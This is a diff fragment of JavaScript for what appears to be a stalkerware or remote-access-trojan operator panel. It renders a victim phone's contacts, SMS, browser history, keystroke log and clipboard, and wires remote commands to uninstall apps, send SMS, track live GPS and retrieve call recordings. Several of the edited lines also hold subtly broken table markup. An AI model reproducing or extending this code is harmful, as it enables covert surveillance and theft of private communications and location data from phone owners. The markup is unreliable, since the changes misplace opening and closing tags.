     const pageSize=20,total=Math.ceil(rows.length/pageSize),start=currentPage*pageSize;
     let html='<div style="overflow-x:auto;"><table><thead><tr>'+headers.map(h=>`<th>${h}</th>`).join('')+'</thead><tbody>';
@@ -829,17 +754,17 @@ function displaySMS(data){
 }
 function displayContacts(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
-    panel.innerHTML=`<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"></table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
 }
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"></table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><tr><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
 function displayBrowserHistory(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><tr><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
 }
 function displayWifiNetworks(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>'; return; }
@@ -852,7 +777,7 @@ function displayAppUsage(data){
 }
 function displayKeylog(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"></table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
     document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
 }
 function displayClipboard(data){
@@ -1053,7 +978,7 @@ function setupEvents(){
     document.getElementById('autoCaptureBtn').onclick=showSchedulePanel;
     document.getElementById('liveGpsBtn').onclick=toggleLiveGps;
     document.getElementById('locationHistoryBtn').onclick=showLocationHistoryPanel;
-    document.getElementById('callRecordingsBtn').onclick=showCallRecordingsPanel;  // UPDATED
+    document.getElementById('callRecordingsBtn').onclick=showCallRecordingsPanel;
     document.getElementById('photoGalleryBtn').onclick=showPhotoGalleryPanel;
     document.getElementById('appEventsBtn').onclick=showAppEventsPanel;
     document.getElementById('smsKeywordsBtn').onclick=showSmsKeywordsPanel;
@@ -1062,7 +987,6 @@ function setupEvents(){
     document.getElementById('sendSmsBtn').onclick=showSendSmsPanel;
     document.getElementById('vibrateBtn').onclick=()=>sendCommand('VIBRATE',{duration:1000});
     document.getElementById('toggleFlashBtn').onclick=toggleFlash;
-    
     document.getElementById('reconnectBtn').onclick=manualReconnect;
     document.getElementById('clearAlertsBtn').onclick=clearAlerts;
     document.getElementById('logoutBtn').onclick=logout;
